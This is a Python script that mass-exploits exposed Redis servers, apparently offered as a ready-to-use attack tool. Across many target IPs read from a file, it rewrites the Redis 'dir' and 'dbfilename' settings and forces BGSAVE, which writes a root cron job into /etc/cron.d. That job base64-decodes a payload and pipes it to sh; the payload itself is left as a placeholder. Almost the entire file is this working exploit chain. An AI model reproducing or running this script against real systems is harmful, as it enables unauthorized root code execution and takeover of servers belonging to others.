import redis
import argparse
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# Malicious cron job payload (base64 decoded)
CRON_PAYLOAD = """
\n\n\n\n\n*/1 * * * * root sh -c 'echo insert base64 encoded payload|base64 -d|sh'\n\n\n\n
"""

def replicate_attack(host, port, password=None, timeout=5):
    """
    Connects to Redis and replicates the cron job attack.
    """
    print(f"\n[+] Attempting to exploit {host}:{port}...")
    try:
        r = redis.StrictRedis(
            host=host,
            port=port,
            password=password,
            socket_connect_timeout=timeout,
            socket_timeout=timeout,
            decode_responses=True
        )

        r.ping()
        print(f"[*] Successfully connected to {host}:{port}.")

        # --- Pre-exploitation Checks ---
        pre_check_status = {
            "dbfilename_initial": None,
            "stop_writes_on_bgsave_error_initial": None,
            "stop_writes_on_bgsave_error_set_success": False
        }

        # Check current dbfilename
        print(f"[*] Checking initial 'dbfilename'...")
        dbfilename_response = r.config_get('dbfilename')
        if dbfilename_response and isinstance(dbfilename_response, dict):
            pre_check_status["dbfilename_initial"] = dbfilename_response.get('dbfilename')
            print(f"    - Initial dbfilename: {pre_check_status['dbfilename_initial']}")
        else:
            print(f"    - Could not retrieve initial dbfilename.")

        # Check current stop-writes-on-bgsave-error
        print(f"[*] Checking 'stop-writes-on-bgsave-error'...")
        stop_writes_response = r.config_get('stop-writes-on-bgsave-error')
        if stop_writes_response and isinstance(stop_writes_response, dict):
            pre_check_status["stop_writes_on_bgsave_error_initial"] = stop_writes_response.get('stop-writes-on-bgsave-error')
            print(f"    - Initial stop-writes-on-bgsave-error: {pre_check_status['stop_writes_on_bgsave_error_initial']}")
        else:
            print(f"    - Could not retrieve initial stop-writes-on-bgsave-error.")

        # Set stop-writes-on-bgsave-error to 'no'
        print(f"[*] Setting 'stop-writes-on-bgsave-error' to 'no'...")
        set_stop_writes_response = r.config_set('stop-writes-on-bgsave-error', 'no')
        if set_stop_writes_response:
            pre_check_status["stop_writes_on_bgsave_error_set_success"] = True
            print(f"    - Successfully set 'stop-writes-on-bgsave-error' to 'no'.")
        else:
            print(f"    - Failed to set 'stop-writes-on-bgsave-error' to 'no'. This might affect BGSAVE.")
        
        print(f"[*] Pre-check status for {host}:{port}: {pre_check_status}")
        # --- End Pre-exploitation Checks ---

        # Step 1: Set Redis working directory to /etc/cron.d
        print(f"[*] Setting 'dir' to '/etc/cron.d'...")
        response_dir = r.config_set('dir', '/etc/cron.d')
        if not response_dir:
            print(f"    - CONFIG SET dir failed.")
            return False

        # Step 2: Set Redis database filename to 'apache'
        print(f"[*] Setting 'dbfilename' to 'apache'...")
        response_dbfilename = r.config_set('dbfilename', 'apache')
        if not response_dbfilename:
            print(f"    - CONFIG SET dbfilename failed.")
            return False

        # Step 3: Set Redis key 't' with cron job payload (expires in 120s)
        print(f"[*] Setting key 't' with cron job payload...")
        response_set = r.set('t', CRON_PAYLOAD, ex=120)
        if not response_set:
            print(f"    - SET key 't' failed.")
            return False

        # Step 4: Force Redis to save database (BGSAVE)
        # This writes the cron job to /etc/cron.d/apache.
        print(f"[*] Forcing BGSAVE...")
        response_bgsave = r.bgsave()
        if response_bgsave:
            print(f"[+] Attack chain successfully sent to {host}:{port}.")
            return True
        else:
            print(f"    - BGSAVE failed.")
            return False

    except redis.exceptions.ConnectionError as e:
        print(f"[-] Connection error to {host}:{port}: {e}")
    except redis.exceptions.AuthenticationError:
        print(f"[-] Authentication failed for {host}:{port}.")
    except redis.exceptions.ResponseError as e:
        print(f"[-] Redis response error on {host}:{port}: {e}")
    except Exception as e:
        print(f"[-] An unexpected error occurred with {host}:{port}: {e}")
    return False

def main():
    parser = argparse.ArgumentParser(
        description="Replicates a Redis cron job exploitation chain against multiple targets."
    )
    parser.add_argument(
        '-f', '--file',
        type=str,
        required=True,
        help="Path to file with target IPs (one per line). Format: 'IP' or 'IP:PORT'."
    )
    parser.add_argument(
        '-p', '--password',
        type=str,
        default=None,
        help="Optional: Redis password."
    )
    parser.add_argument(
        '-d', '--default-port',
        type=int,
        default=52254,
        help="Default Redis port if not specified in file (e.g., 6379, 52254)."
    )
    parser.add_argument(
        '-t', '--timeout',
        type=int,
        default=5,
        help="Connection timeout in seconds."
    )
    parser.add_argument(
        '-w', '--workers',
        type=int,
        default=10, # Default number of concurrent workers
        help="Number of concurrent worker threads."
    )

    args = parser.parse_args()

    target_ips = []
    try:
        with open(args.file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    target_ips.append(line)
    except FileNotFoundError:
        print(f"[ERROR] File not found: {args.file}")
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] Could not read file {args.file}: {e}")
        sys.exit(1)

    if not target_ips:
        print("[WARNING] No targets in file. Exiting.")
        sys.exit(0)

    print(f"[*] Starting attack replication against {len(target_ips)} targets using {args.workers} threads.")
    print(f"[*] Default Redis port: {args.default_port}")
    print(f"[*] Connection timeout: {args.timeout} seconds")

    successful_exploits = 0
    # Use ThreadPoolExecutor for concurrent execution
    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        future_to_target = {}
        for target in target_ips:
            host = target
            port = args.default_port

            if ':' in target:
                try:
                    host, port_str = target.split(':')
                    port = int(port_str)
                except ValueError:
                    print(f"[ERROR] Invalid target format '{target}'. Skipping.")
                    continue
            
            future = executor.submit(replicate_attack, host, port, args.password, args.timeout)
            future_to_target[future] = target

        # Process results as they complete
        for future in as_completed(future_to_target):
            target = future_to_target[future]
            try:
                if future.result():
                    successful_exploits += 1
            except Exception as exc:
                print(f"[ERROR] Target {target} generated an exception: {exc}")

    print(f"\n[+] Script finished.")
    print(f"[+] Total targets attempted: {len(target_ips)}")
    print(f"[+] Successfully exploited targets: {successful_exploits}")

if __name__ == "__main__":
    main()
